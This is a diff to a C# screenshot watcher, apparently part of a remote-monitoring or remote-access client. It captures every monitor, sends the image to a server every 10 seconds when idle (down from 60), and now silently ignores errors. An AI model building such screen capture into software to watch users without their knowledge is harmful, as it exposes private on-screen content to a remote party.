@@ -63,9 +63,9 @@ namespace Client.Armitage.Watchers
         }
         #endregion
         /// <summary>
-        /// If nothing happened in 60 seconds just send a screenshot.
+        /// If nothing happened in 10 seconds just send a screenshot.
         /// </summary>
-        private static int MaxTimeLimit = 60;
+        private static int MaxTimeLimit = 10;
 
         private static System.Timers.Timer _refreshtimer;
         public static void Start()
@@ -92,7 +92,8 @@ namespace Client.Armitage.Watchers
         /// Screenshots all monitors into a single bitmap.
         /// </summary>
         /// <returns>A byte array of the compressed screenshot.</returns>
-        public static byte[] Screenshot() {
+        public static byte[] Screenshot()
+        {
             /// Determine the size of the "virtual screen", which includes all monitors.
             int screenLeft = SystemInformation.VirtualScreen.Left;
             int screenTop = SystemInformation.VirtualScreen.Top;
@@ -139,12 +140,18 @@ namespace Client.Armitage.Watchers
         /// <summary>
         /// Sends a screenshot to the server.
         /// </summary>
-        public async static void SendOne() {
-            await Task.Run(() => {
-                var bytes = Screenshot();
-                Communication.File_Stacker.Send(bytes, Communication.File_Stacker.Filetype.Screenshot);
-                Debug.WriteLine($"Screenshot Sent: {bytes.Length}");
-            }); 
+        public async static void SendOne()
+        {
+            await Task.Run(() =>
+            {
+                try
+                {
+                    var bytes = Screenshot();
+                    Communication.File_Stacker.Send(bytes, Communication.File_Stacker.Filetype.Screenshot);
+                    Debug.WriteLine($"Screenshot Sent: {bytes.Length}");
+                }
+                catch { }
+            });
         }
         private static void _refreshtimer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
